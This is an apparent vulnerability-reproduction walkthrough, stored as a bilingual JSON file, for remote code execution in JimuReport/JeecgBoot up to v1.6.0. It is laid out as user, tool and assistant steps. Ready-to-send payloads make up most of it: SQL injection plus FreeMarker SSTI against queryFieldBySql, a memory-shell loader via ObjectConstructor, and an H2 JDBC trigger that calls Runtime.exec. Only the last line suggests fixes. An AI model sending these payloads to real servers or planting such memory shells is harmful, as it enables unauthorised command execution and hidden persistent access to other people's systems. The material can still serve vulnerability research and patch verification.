@@ -1,0 +1,71 @@
+﻿{
+  "_source_md": "JMReport/2024-08-01-JMReport-Code-Execute-Vuln.md",
+  "version": "jmreport-code-execute",
+  "title": {
+    "zh": "JimuReport (JeecgBoot) 代码执行漏洞复现",
+    "en": "JimuReport (JeecgBoot) Code Execution Vulnerability Reproduction"
+  },
+  "description": {
+    "zh": "利用 JeecgBoot 集成的 JimuReport 组件的 SQL 注入和 SSTI 漏洞实现远程代码执行，包括内存马注入。",
+    "en": "Exploit SQL injection and SSTI vulnerabilities in JeecgBoot's JimuReport component to achieve remote code execution, including memory shell injection."
+  },
+  "steps": [
+    {
+      "type": "user_message",
+      "content": { "zh": "确认目标系统运行 JeecgBoot 并集成 JimuReport 组件（版本 <= v1.6.0）", "en": "Confirm target runs JeecgBoot with JimuReport component (version <= v1.6.0)" },
+      "annotation": { "zh": "JimuReport 是 JeecgBoot 的报表模块", "en": "JimuReport is JeecgBoot's report module" }
+    },
+    {
+      "type": "system_event",
+      "content": { "zh": "漏洞点：/jeecg-boot/jmreport/queryFieldBySql — SQL 注入 + FreeMarker SSTI", "en": "Vulnerability: /jeecg-boot/jmreport/queryFieldBySql — SQL injection + FreeMarker SSTI" },
+      "annotation": { "zh": "两个入口均利用模板引擎注入实现 RCE", "en": "Both endpoints exploit template engine injection for RCE" }
+    },
+    {
+      "type": "user_message",
+      "content": { "zh": "发送 SQL 注入 + FreeMarker SSTI payload：", "en": "Send SQL injection + FreeMarker SSTI payload:" },
+      "codeBlocks": [
+        {
+          "language": "http",
+          "code": "POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"sql\":\"select 'result:<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ ex(\\\"open -a calculator.app\\\") }' \"}",
+          "caption": { "zh": "SQL注入触发FreeMarker模板执行", "en": "SQL injection triggers FreeMarker template execution" }
+        }
+      ],
+      "annotation": { "zh": "通过 SQL 注入点触发 FreeMarker 模板引擎执行系统命令", "en": "Trigger FreeMarker template engine via SQL injection" }
+    },
+    {
+      "type": "tool_result",
+      "content": { "zh": "目标主机弹出计算器，确认命令执行成功", "en": "Calculator pops up on target host, confirming command execution" },
+      "toolName": "curl",
+      "annotation": { "zh": "利用 FreeMarker 的 ?new() 实例化 Execute 类", "en": "Use FreeMarker's ?new() to instantiate Execute class" }
+    },
+    {
+      "type": "user_message",
+      "content": { "zh": "注入内存马 payload：", "en": "Inject memory shell payload:" },
+      "codeBlocks": [
+        {
+          "language": "json",
+          "code": "{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval(\\\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();bytecodeBase64='BASE64_MEMORY_SHELL';...\\\")}\",\"dbSource\":\"\",\"type\":\"0\"}",
+          "caption": { "zh": "内存马注入payload（bytecodeBase64需替换）", "en": "Memory shell injection payload (replace bytecodeBase64)" }
+        }
+      ],
+      "annotation": { "zh": "通过 ObjectConstructor 加载内存马字节码", "en": "Load memory shell bytecode via ObjectConstructor" }
+    },
+    {
+      "type": "user_message",
+      "content": { "zh": "备选方案：testConnection 接口 JDBC SSTI：", "en": "Alternative: testConnection JDBC SSTI:" },
+      "codeBlocks": [
+        {
+          "language": "json",
+          "code": "{\n  \"dbType\": \"H2\",\n  \"dbDriver\": \"org.h2.Driver\",\n  \"dbUrl\": \"jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec('open -a calculator.app')\\n$$\",\n  \"dbName\": \"test\",\n  \"dbUsername\": \"sa\",\n  \"dbPassword\": \"\"\n}",
+          "caption": { "zh": "H2数据库JDBC URL注入JavaScript", "en": "H2 database JDBC URL injects JavaScript" }
+        }
+      ],
+      "annotation": { "zh": "利用 H2 数据库的 CREATE TRIGGER 语法执行 JavaScript", "en": "Use H2 CREATE TRIGGER syntax to execute JavaScript" }
+    },
+    {
+      "type": "assistant_text",
+      "content": { "zh": "漏洞总结：queryFieldBySql 存在 SQL 注入 + FreeMarker SSTI，支持内存马注入；testConnection JDBC SSTI 作为备选 RCE 路径。影响版本：JimuReport <= v1.6.0", "en": "Summary: queryFieldBySql has SQL injection + FreeMarker SSTI, supports memory shell injection; testConnection JDBC SSTI as alternative RCE path. Affected: JimuReport <= v1.6.0" },
+      "annotation": { "zh": "修复建议：升级 JimuReport，禁用 FreeMarker ?new() 和 ObjectConstructor", "en": "Fix: Upgrade JimuReport, disable FreeMarker ?new() and ObjectConstructor" }
+    }
+  ]
+}
